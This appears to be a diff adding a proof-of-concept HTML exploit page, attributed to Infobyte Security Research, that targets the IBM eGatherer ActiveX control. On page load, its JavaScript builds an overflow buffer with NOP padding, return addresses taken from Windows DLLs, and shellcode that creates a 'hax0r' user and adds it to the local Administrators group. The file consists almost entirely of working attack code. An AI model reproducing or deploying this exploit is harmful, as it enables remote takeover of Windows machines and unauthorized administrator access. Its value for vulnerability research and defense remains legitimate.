@@ -1,0 +1,41 @@
+
+<html>
+<!-- 
+    [ISR] Infobyte Security Research
+     www.infobyte.com.ar
+     PoC IBM eGatherer Active 
+     Author: Francisco Amato
+-->
+<head>
+	<title>IBM&ISS congratulation</title>
+
+</head>
+<object classid='clsid:74FFE28D-2378-11D5-990C-006094235084' id='notCompromising'></object>
+<script>
+var buff="";
+for (i=0;i<260;i++) buff=buff+unescape("%90"); //padding
+//75041111 .data WS2_32.DLL
+buff=buff+unescape("%11%11%04%75"); //.data
+buff=buff+unescape("%11%11%04%75"); //.data
+for (i=0;i<12;i++) buff=buff+unescape("%90"); //padding
+//7CE4F8A6 CALL ESP ole32.dll
+buff=buff+unescape("%b6%e1%e8%7c"); //write eip
+buff=buff+unescape("%b6%e1%e8%7c"); //write eip
+for (i=0;i<80;i++) buff=buff+unescape("%90"); //padding
+//JMP safe ? shellcode
+buff=buff+unescape("%E9%FD%FA%FF%FF"); //adduser
+for (i=0;i<80;i++) buff=buff+unescape("%90"); //padding
+
+//shellcode adduser shellcode user:hax0r pass:vete
+buff=buff+unescape("%31%c9%66%b9%30%72%51%68%20%68%61%78%68%2f%41%44%44%68%72%65%73%20%68%72%61%64%6f%68%6e%69%73%74%68%41%64%6d%69%68%6f%75%70%20%68%61%6c%67%72%68%20%6c%6f%63%68%20%6e%65%74%68%44%20%26%26%68%20%2f%41%44%68%76%65%74%65%68%78%30%72%20%68%72%20%68%61%68%20%75%73%65%68%20%6e%65%74%68%65%20%2f%63%68%64%2e%65%78%68%41%41%63%6d%31%c0%50%31%c0%8d%4c%24%06%51%bb%fa%74%59%7c%ff%d3%31%c0%50%bb%be%69%47%79%ff%d3");
+
+
+for (i=0;i<50;i++)buff=buff+unescape("%90"); //shit
+
+var comp = document.getElementById('notCompromising');
+comp.RunEgatherer(buff);
+
+</script>
+
+</body>
+</html>
